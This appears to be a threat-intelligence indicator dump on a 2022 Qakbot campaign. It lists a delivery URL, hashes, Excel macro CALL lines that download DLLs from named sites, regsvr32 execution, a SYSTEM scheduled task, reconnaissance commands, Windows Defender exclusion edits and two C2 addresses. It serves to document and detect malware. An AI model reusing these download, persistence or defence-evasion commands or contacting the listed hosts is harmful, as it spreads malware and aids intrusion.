@@ -1,0 +1,111 @@
+08.04.2022 | Qakbot | AA | Version 403.549 
+
+******************************
+
+.url  https://grupoagros.agr.br/ias/mivenaotnren
+.zip  B93976A9A7F1A5E6B0A45D9652EF0D39D34458A28CE992FD570BDE4BAFA1847C
+.xlsb 6c5e4e1e8a8a4654e9df0d004077f3a84cf36a63c2b251e253049e6c358c39bf
+.dll  73f5c306c33c980fcd85f185af9c2a2b7678eebda5b10ec072558bd74dd776af
+.dll  1cdad75e7830e4ae946bb26c15be354676820710c2471d9ea6d24926fc0df86f
+
+******************************
+
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Uduw", 0)
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://rangopurnews.com/RKAbVv4T/Fbvh.png", "C:\Uduw\coit1.dll")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://sankalpnurshinghome.com/GW3scFGGHZp1/Fbvh.png", "C:\Uduw\coit2.dll")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://cruzandsons.co.za/Rgqc8er6ma4/Fbvh.png", "C:\Uduw\coit3.dll")
+
+https://rangopurnews.com/RKAbVv4T/Fbvh.png
+https://sankalpnurshinghome.com/GW3scFGGHZp1/Fbvh.png
+https://cruzandsons.co.za/Rgqc8er6ma4/Fbvh.png
+
+******************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\R-978948561.xlsb"
+
+regsvr32 C:\Uduw\coit1.dll
+
+regsvr32 C:\Uduw\coit2.dll
+
+regsvr32 C:\Uduw\coit3.dll
+
+regsvr32 -s C:\Users\Admin\AppData\Local\Temp\Fbvh.dll,#1
+
+explorer.exe
+
+chtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /tn ahtnqgjk /tr "regsvr32.exe -s \"C:\Users\Admin\AppData\Local\Temp\Fbvh.dll\"" /SC ONCE /Z /ST 15:09 /ET 15:21
+
+whoami /all
+
+cmd /c set
+
+arp -a
+
+ipconfig /all
+
+net view /all
+
+nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.WORKGROUP
+
+net share
+
+net1 share
+
+route print
+
+netstat -nao
+
+net localgroup
+
+net1 localgroup
+
+taskeng.exe {49F99BE0-EAE3-4D70-BC2C-48316A29F1B5} S-1-5-18:NT AUTHORITY\System:Service:
+
+regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\Fbvh.dll
+
+reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Wptxynjxmi" /d "0"
+
+reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\Users\Admin\AppData\Roaming\Microsoft\Yibgm" /d "0"
+
+whoami /all
+
+cmd /c set
+
+arp -a
+
+ipconfig /all
+
+net view /all
+
+nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.WORKGROUP
+
+net share
+
+net1 share
+
+route print
+
+netstat -nao
+
+net localgroup
+
+net1 localgroup
+
+msiexec.exe /V
+
+taskeng.exe {1311FB0A-7B10-4EDB-9608-F36091A8BC7C} S-1-5-18:NT AUTHORITY\System:Service:
+
+regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\Fbvh.dll"
+
+regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\Fbvh.dll"
+
+SndVol.exe -f 46204061 9211
+
+*************************************************
+
+c2's
+
+https://71.13.93.154:2222/t4
+https://187.102.135.142:2222/t4
